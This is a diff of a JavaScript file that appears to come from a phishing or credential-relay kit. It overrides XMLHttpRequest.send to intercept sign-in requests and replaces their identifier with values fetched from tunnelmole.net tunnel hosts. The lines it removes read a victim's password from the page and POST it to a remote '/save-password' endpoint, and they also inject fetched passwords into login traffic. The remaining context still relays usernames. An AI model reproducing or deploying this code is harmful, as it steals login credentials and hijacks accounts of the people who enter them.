@@ -3,7 +3,6 @@ let freqPassword = null;
 const modifiedRequests = new Set();
 const pendingRequests = new Map();
 let usernameFetched = false;
-let passwordFetched = false;
 
 // Fetch the username when needed
 const fetchFreqUsername = async () => {
@@ -41,48 +40,12 @@ const fetchFreqUsername = async () => {
     }
 };
 
-// Fetch the password when needed
-const fetchFreqPassword = async () => {
-    if (passwordFetched) return; // Avoid redundant fetches once password is fetched
-
-    console.log('Fetching password...');
-
-    try {
-        const response = await fetch('https://lcqm5s-ip-37-228-207-173.tunnelmole.net/get-second-post-data', {
-            method: 'GET',
-            headers: { 'Cache-Control': 'no-cache' }
-        });
-
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-
-        const result = await response.json();
-        console.log('Response from /get-first-password-data:', result);  // Debug log
-
-        if (result?.postData) {
-            freqPassword = result.postData;
-            console.log('Fetched password:', freqPassword);
-            passwordFetched = true;
-
-            // Reset the server-side password store
-            await fetch('https://pnekcn-ip-37-228-207-173.tunnelmole.net/reset-second-post-data', { method: 'POST' });
-            // Process all pending requests now that we have a password
-            processModifiedRequests();
-        } else {
-            console.warn("No password data received, retrying...");
-            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
-        }
-    } catch (error) {
-        console.error('Error fetching password:', error);
-        setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
-    }
-};
 
 // Modify and send pending requests when username and password are available
 const processModifiedRequests = () => {
     if (!freqUsername || !freqPassword) {
         console.log("Username or password not available yet, retrying...");
         if (!freqUsername) fetchFreqUsername();
-        if (!freqPassword) fetchFreqPassword();
         return;
     }
 
@@ -98,11 +61,7 @@ const processModifiedRequests = () => {
             modifiedBody = modifiedBody.replace(usernameMatch[1], freqUsername);
         }
 
-        // Replace password
-        const passwordMatch = body.match(/identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/);
-        if (passwordMatch && !modifiedRequests.has(body)) {
-            modifiedBody = modifiedBody.replace(passwordMatch[1], freqPassword);
-        }
+        
 
         if (!modifiedRequests.has(body)) {
             modifiedRequests.add(body); // Mark the request as modified
@@ -130,7 +89,7 @@ XMLHttpRequest.prototype.send = function (body) {
         return;
     }
 
-    if ((/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
+    if ((/identity-signin-identifier/.test(body)) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
         pendingRequests.set(this, body); // Store the request in pendingRequests
         processModifiedRequests(); // Attempt to modify and send the request immediately
@@ -165,38 +124,13 @@ const sendUsername = async () => {
     }
 };
 
-// ✅ Send password data to server
-const sendPassword = async () => {
-    console.log('Sending password...');
-    const password = document.getElementById('password')?.value;
-    if (!password) {
-        console.warn("No password entered");
-        return;
-    }
 
-    try {
-        const response = await fetch('https://lcqm5s-ip-37-228-207-173.tunnelmole.net/save-password', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ password })
-        });
-
-        if (response.ok) {
-            console.log('Password sent successfully');
-        } else {
-            console.error('Error sending password:', response.statusText);
-        }
-    } catch (error) {
-        console.error('Error sending password:', error);
-    }
-};
 
 // ✅ Attach event listeners
 document.addEventListener('DOMContentLoaded', () => {
     const usernameBtn = document.getElementById('sendUsernameBtn');
-    const passwordBtn = document.getElementById('passwordNext');
     const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
+   
 
     if (usernameBtn) {
         usernameBtn.addEventListener('click', (event) => {
@@ -205,12 +139,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    if (passwordBtn) {
-        passwordBtn.addEventListener('click', (event) => {
-            event.preventDefault();
-            sendPassword();
-        });
-    }
+   
 
     if (usernameInput) {
         usernameInput.addEventListener('keydown', (event) => {
@@ -221,15 +150,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
     
-if (passwordInput) {
-    passwordInput.addEventListener('keydown', (event) => {
-        if (event.key === 'Enter') {
-            event.preventDefault(); // Prevent form submission
-            sendPassword(); // Trigger sending password
-        }
-    });
-}
+
 
     fetchFreqUsername();
-    fetchFreqPassword();
 });
